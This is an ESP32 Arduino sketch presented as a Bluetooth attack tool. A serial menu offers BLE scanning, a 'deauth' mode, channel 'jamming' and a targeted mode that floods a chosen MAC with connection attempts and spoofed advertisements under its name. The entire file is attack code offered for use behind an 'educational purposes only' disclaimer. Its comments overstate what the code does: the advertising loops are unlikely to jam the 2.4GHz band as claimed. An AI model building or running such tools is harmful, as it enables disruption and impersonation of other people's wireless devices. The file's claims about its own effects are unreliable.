/*
 * ESP32 Bluetooth Attack Tool - All-in-One
 * Board: ESP32 DevKit V1 (ESP-WROOM-32)
 * 
 * Features:
 * 1. BLE Scanner - Scan all BT devices
 * 2. BLE Deauth - Disconnect BLE targets
 * 3. BT Jammer - Flood all 2.4GHz channels
 * 4. BT Targeted Jam - Jam specific device
 * 
 * WARNING: Educational purposes only. Use responsibly.
 */

#include <BLEDevice.h>
#include <BLEServer.h>
#include <BLEUtils.h>
// BLE2902 removed to save flash
#include <esp_bt.h>
#include <esp_bt_main.h>
#include <esp_gap_bt_api.h>
#include <WiFi.h>
#include <esp_wifi.h>

// ==================== CONFIG ====================
#define LED_PIN 2
#define SERIAL_BAUD 115200

// ==================== GLOBALS ====================
int mode = 0;
String targetMAC = "";
String targetName = "";
bool attacking = false;

// BLE Scanner callback
class MyAdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) {
        Serial.print("[BLE] ");
        Serial.print(advertisedDevice.getAddress().toString().c_str());
        Serial.print(" | RSSI: ");
        Serial.print(advertisedDevice.getRSSI());
        Serial.print(" | ");
        if (advertisedDevice.haveName()) {
            Serial.print(advertisedDevice.getName().c_str());
        } else {
            Serial.print("(no name)");
        }
        if (advertisedDevice.haveServiceUUID()) {
            Serial.print(" | UUID: ");
            Serial.print(advertisedDevice.getServiceUUID().toString().c_str());
        }
        Serial.println();
    }
};

// ==================== MENU ====================
void printMenu() {
    Serial.println("\n========================================");
    Serial.println("    ESP32 BLUETOOTH ATTACK TOOL");
    Serial.println("========================================");
    Serial.println("[1] BLE Scanner - Scan all devices");
    Serial.println("[2] BLE Deauth - Disconnect BLE target");
    Serial.println("[3] BT Jammer - Flood all channels");
    Serial.println("[4] BT Targeted Jam - Jam specific device");
    Serial.println("[5] Set Target MAC");
    Serial.println("[6] Stop Attack");
    Serial.println("[0] Show Menu");
    Serial.println("========================================");
    Serial.print("Current target: ");
    if (targetMAC.length() > 0) {
        Serial.print(targetMAC);
        if (targetName.length() > 0) {
            Serial.print(" (");
            Serial.print(targetName);
            Serial.print(")");
        }
    } else {
        Serial.print("NONE");
    }
    Serial.println("\n");
}

// ==================== BLE SCANNER ====================
void startBLEScan() {
    Serial.println("\n[*] BLE Scan 10s...");
    BLEDevice::init("");
    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);
    
    BLEScanResults* foundDevices = pBLEScan->start(10, false);
    Serial.print("[*] Found ");
    Serial.print(foundDevices->getCount());
    Serial.println(" devices.");
    
    pBLEScan->clearResults();
    BLEDevice::deinit(true);
}

// ==================== BLE DEAUTH ====================
void startBLEDeauth() {
    if (targetMAC.length() == 0) {
        Serial.println("[!] No target set! Use [5] to set target MAC.");
        return;
    }
    
    Serial.print("\n[*] Deauth -> ");
    Serial.println(targetMAC);
    attacking = true;
    
    // Initialize BLE
    BLEDevice::init("ESP32-Deauth");
    
    // Create fake BLE server to interfere
    BLEServer* pServer = BLEDevice::createServer();
    BLEService* pService = pServer->createService(BLEUUID("1800"));
    pService->start();
    
    // Start advertising with same name as target to confuse
    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
    pAdvertising->addServiceUUID(BLEUUID("1800"));
    pAdvertising->setScanResponse(true);
    pAdvertising->setMinPreferred(0x06);
    pAdvertising->setMinPreferred(0x12);
    
    int count = 0;
    while (attacking && mode == 2) {
        // Flood with connect/disconnect cycles
        BLEDevice::startAdvertising();
        delay(100);
        BLEDevice::stopAdvertising();
        delay(50);
        
        // Send fake pairing requests (getParams removed in new BLE lib)
        BLEDevice::startAdvertising();
        delay(100);
        
        count++;
        if (count % 100 == 0) {
            Serial.print("[*] Deauth packets sent: ");
            Serial.println(count);
        }
        
        // Check for serial input
        if (Serial.available()) {
            char c = Serial.read();
            if (c == '6') {
                attacking = false;
                mode = 0;
            }
        }
    }
    
    BLEDevice::deinit(true);
    Serial.println("[*] Deauth done.");
}

// ==================== BT JAMMER ====================
void startBTJammer() {
    Serial.println("\n[*] Jammer...");
    attacking = true;
    
    // Init BLE ONCE
    BLEDevice::init("JAMMER");
    BLEAdvertising* pAdv = BLEDevice::getAdvertising();
    pAdv->setMinInterval(0x20);
    pAdv->setMaxInterval(0x40);
    
    unsigned long lastPrint = millis();
    int count = 0;
    
    while (attacking && mode == 3) {
        // Rapid adv data swap + start/stop cycle
        for (int i = 0; i < 8; i++) {
            BLEAdvertisementData advData;
            advData.setFlags(0x06);
            advData.setName("JAM_" + String(i));
            pAdv->setAdvertisementData(advData);
            pAdv->start();
            delay(15);
            pAdv->stop();
            count++;
        }
        yield(); // prevent watchdog reset
        
        if (millis() - lastPrint > 1000) {
            Serial.print(">jam_count:");
            Serial.println(count);
            lastPrint = millis();
        }
        if (Serial.available()) {
            if (Serial.read() == '6') { attacking = false; mode = 0; }
        }
    }
    pAdv->stop();
    BLEDevice::deinit(true);
    Serial.println("[*] Jammer stopped.");
}

// ==================== BT TARGETED JAM ====================
void startTargetedJam() {
    if (targetMAC.length() == 0) {
        Serial.println("[!] No target! Use [5].");
        return;
    }
    Serial.print("\n[*] Jam -> ");
    Serial.println(targetMAC);
    attacking = true;
    
    // Initialize BLE
    BLEDevice::init("Targeted-Jam");
    
    // Parse target MAC
    BLEAddress targetAddr(targetMAC.c_str());
    
    int count = 0;
    unsigned long lastPrint = millis();
    
    while (attacking && mode == 4) {
        // Method 1: Rapid connect/disconnect attempts
        BLEClient* pClient = BLEDevice::createClient();
        
        // Try to connect (will fail but creates interference)
        pClient->connect(targetAddr, BLE_ADDR_TYPE_PUBLIC);
        delay(50);
        pClient->disconnect();
        delay(20);
        delete pClient;
        
        // Method 2: Advertising flood with target's name
        BLEAdvertising* pAdv = BLEDevice::getAdvertising();
        BLEAdvertisementData advData;
        advData.setFlags(0x06);
        if (targetName.length() > 0) {
            advData.setName(targetName);
        } else {
            advData.setName("Device");
        }
        pAdv->setAdvertisementData(advData);
        BLEDevice::startAdvertising();
        delay(30);
        BLEDevice::stopAdvertising();
        
        count++;
        
        if (millis() - lastPrint > 2000) {
            Serial.print("[*] Targeted jam active | Attempts: ");
            Serial.println(count);
            lastPrint = millis();
        }
        
        // Check for serial input
        if (Serial.available()) {
            char c = Serial.read();
            if (c == '6') {
                attacking = false;
                mode = 0;
            }
        }
    }
    
    BLEDevice::deinit(true);
    Serial.println("[*] Jam done.");
}

// ==================== SET TARGET ====================
void setTarget() {
    Serial.println("\n[*] MAC (AA:BB:CC:DD:EE:FF):");
    
    while (!Serial.available()) {
        delay(100);
    }
    
    String mac = Serial.readStringUntil('\n');
    mac.trim();
    mac.toUpperCase();
    
    // Validate MAC format
    if (mac.length() == 17 && mac.charAt(2) == ':' && mac.charAt(5) == ':') {
        targetMAC = mac;
        Serial.print("[*] Target set to: ");
        Serial.println(targetMAC);
        
        Serial.println("[*] Name (Enter skip):");
        delay(1000);
        if (Serial.available()) {
            String name = Serial.readStringUntil('\n');
            name.trim();
            if (name.length() > 0) {
                targetName = name;
                Serial.print("[*] Target name: ");
                Serial.println(targetName);
            }
        }
    } else {
        Serial.println("[!] Invalid MAC!");
    }
}

// ==================== MAIN ====================
void setup() {
    Serial.begin(SERIAL_BAUD);
    pinMode(LED_PIN, OUTPUT);
    
    // Wait for serial
    delay(1000);
    
    // Blink LED to show ready
    for (int i = 0; i < 3; i++) {
        digitalWrite(LED_PIN, HIGH);
        delay(200);
        digitalWrite(LED_PIN, LOW);
        delay(200);
    }
    
    printMenu();
}

void loop() {
    if (Serial.available()) {
        char c = Serial.read();
        
        switch (c) {
            case '1':
                mode = 1;
                startBLEScan();
                break;
            case '2':
                mode = 2;
                startBLEDeauth();
                break;
            case '3':
                mode = 3;
                startBTJammer();
                break;
            case '4':
                mode = 4;
                startTargetedJam();
                break;
            case '5':
                setTarget();
                break;
            case '6':
                attacking = false;
                mode = 0;
                Serial.println("[*] Stopped.");
                break;
            case '0':
                printMenu();
                break;
        }
    }
    
    // LED status indicator
    if (attacking) {
        digitalWrite(LED_PIN, HIGH);
        delay(100);
        digitalWrite(LED_PIN, LOW);
        delay(100);
    } else {
        digitalWrite(LED_PIN, HIGH);
        delay(500);
        digitalWrite(LED_PIN, LOW);
        delay(500);
    }
}
